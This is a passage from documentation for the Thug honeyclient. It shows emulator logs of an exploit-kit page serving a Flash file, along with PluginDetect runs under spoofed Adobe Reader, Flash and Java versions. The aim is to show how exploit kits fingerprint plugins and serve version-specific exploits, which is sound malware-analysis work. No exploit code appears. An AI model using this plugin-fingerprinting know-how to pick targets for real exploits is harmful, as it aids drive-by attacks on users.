<span class="s2">[2012-07-02 19:18:28] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
<span class="s2">[2012-07-02 19:18:28] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:18:28] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:18:28] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;</span>
<span class="s2">[2012-07-02 19:18:28] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
<span class="s2">[2012-07-02 19:18:28] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:18:29] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
</pre></div>
</div>
<p>Comparing the following line</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:18:14<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap2.php<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
</pre></div>
</div>
<p>with what we got using Adobe Acrobat Reader 9.1.0</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:15:36<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
</pre></div>
</div>
<p>it’s easy to realize that a different malicious PDF file was served in this case.</p>
</section>
<section id="shockwave-flash">
<h2>Shockwave Flash<a class="headerlink" href="#shockwave-flash" title="Link to this heading"></a></h2>
<p>Taking a look at the available options you can see the -S (–shockwave) option which is quite
useful for getting different Flash exploits which target differents version of Shockwave Flash.
This happens because exploit kits usually serve Flash files which exploit specific vulnerabilities
basing on Shockwave Flash version. Let’s take a look at what happens if we locally analyze
PluginDetect (see Local Analysis later for details).</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src<span class="w"> </span>~<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-l<span class="w"> </span>../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>&lt;object<span class="w"> </span><span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span><span class="w"> </span><span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="w"> </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span><span class="w"> </span><span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>&lt;object<span class="w"> </span><span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span><span class="w"> </span><span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="w"> </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span><span class="w"> </span><span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.9.1.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.9.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.8.1.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.8.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.7.1.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.7.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>javawebstart.isinstalled.1.6.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_40
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_39
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_38
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_37
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_36
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_35
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_34
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_33
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>javaplugin.160_32
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>javawebstart.isinstalled.1.6.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span><span class="o">[</span>Window<span class="o">]</span><span class="w"> </span>Alert<span class="w"> </span>Text:<span class="w"> </span>AdobeReader<span class="w"> </span>version:<span class="w"> </span><span class="m">9</span>,1,0,0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span><span class="o">[</span>Window<span class="o">]</span><span class="w"> </span>Alert<span class="w"> </span>Text:<span class="w"> </span>Flash<span class="w"> </span>version:<span class="w"> </span><span class="m">10</span>,0,64,0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span><span class="o">[</span>Window<span class="o">]</span><span class="w"> </span>Alert<span class="w"> </span>Text:<span class="w"> </span>Java<span class="w"> </span>version:<span class="w"> </span><span class="m">1</span>,6,0,32
</pre></div>
</div>
<p>Let’s try with different Adobe Acrobat Reader and Shockwave Flash versions now.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src<span class="w"> </span>~<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-l<span class="w"> </span>-A<span class="w"> </span><span class="m">8</span>.1.0<span class="w"> </span>-S<span class="w"> </span><span class="m">10</span>.3.1.180<span class="w"> </span>../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>&lt;object<span class="w"> </span><span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span><span class="w"> </span><span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="w"> </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span><span class="w"> </span><span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>&lt;object<span class="w"> </span><span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span><span class="w"> </span><span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="w"> </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span><span class="w"> </span><span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.9.1.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.9.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.8.1.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.8.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.7.1.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.7.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>javawebstart.isinstalled.1.6.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_40
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_39
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_38
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_37
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_36
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_35
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_34
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_33
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>javaplugin.160_32
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>javawebstart.isinstalled.1.6.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span><span class="o">[</span>Window<span class="o">]</span><span class="w"> </span>Alert<span class="w"> </span>Text:<span class="w"> </span>AdobeReader<span class="w"> </span>version:<span class="w"> </span><span class="m">8</span>,1,0,0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span><span class="o">[</span>Window<span class="o">]</span><span class="w"> </span>Alert<span class="w"> </span>Text:<span class="w"> </span>Flash<span class="w"> </span>version:<span class="w"> </span><span class="m">10</span>,3,1,180
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:58<span class="o">]</span><span class="w"> </span><span class="o">[</span>Window<span class="o">]</span><span class="w"> </span>Alert<span class="w"> </span>Text:<span class="w"> </span>Java<span class="w"> </span>version:<span class="w"> </span><span class="m">1</span>,6,0,32
</pre></div>
</div>
</section>
<section id="javaplugin-and-javawebstart">
<h2>JavaPlugin and JavaWebStart<a class="headerlink" href="#javaplugin-and-javawebstart" title="Link to this heading"></a></h2>
<p>Taking a look at the available options you can see the -J (–javaplugin) option which is quite
useful for getting different Java exploits which target different versions of Java. Let’s take
a look at what happens if we locally analyze PluginDetect (see Local Analysis later for details).</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src<span class="w"> </span>~<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-l<span class="w"> </span>../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>&lt;object<span class="w"> </span><span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&quot;</span><span class="w"> </span><span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="w"> </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span><span class="w"> </span><span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>&lt;object<span class="w"> </span><span class="nv">classid</span><span class="o">=</span><span class="s2">&quot;clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA&quot;</span><span class="w"> </span><span class="nv">height</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="w"> </span><span class="nv">style</span><span class="o">=</span><span class="s2">&quot;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:visible;display:inline;&quot;</span><span class="w"> </span><span class="nv">width</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>&gt;&lt;/object&gt;
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.9.1.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.9.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.8.1.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.8.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.7.1.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javawebstart.isinstalled.1.7.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>javawebstart.isinstalled.1.6.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_40
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_39
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_38
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_37
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_36
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_35
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_34
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>javaplugin.160_33
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>javaplugin.160_32
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>javawebstart.isinstalled.1.6.0.0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span><span class="o">[</span>Window<span class="o">]</span><span class="w"> </span>Alert<span class="w"> </span>Text:<span class="w"> </span>AdobeReader<span class="w"> </span>version:<span class="w"> </span><span class="m">9</span>,1,0,0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span><span class="o">[</span>Window<span class="o">]</span><span class="w"> </span>Alert<span class="w"> </span>Text:<span class="w"> </span>Flash<span class="w"> </span>version:<span class="w"> </span><span class="m">10</span>,0,64,0
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:32:26<span class="o">]</span><span class="w"> </span><span class="o">[</span>Window<span class="o">]</span><span class="w"> </span>Alert<span class="w"> </span>Text:<span class="w"> </span>Java<span class="w"> </span>version:<span class="w"> </span><span class="m">1</span>,6,0,32
</pre></div>
</div>
<p>Let’s try with a different JavaPlugin version now.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src<span class="w"> </span>~<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-l<span class="w"> </span>-J<span class="w"> </span><span class="m">1</span>.7.0.7<span class="w"> </span>../samples/misc/PluginDetect-0.7.8.html
<span class="o">[</span><span class="m">2012</span>-11-15<span class="w"> </span><span class="m">17</span>:40:55<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>msxml2.xmlhttp
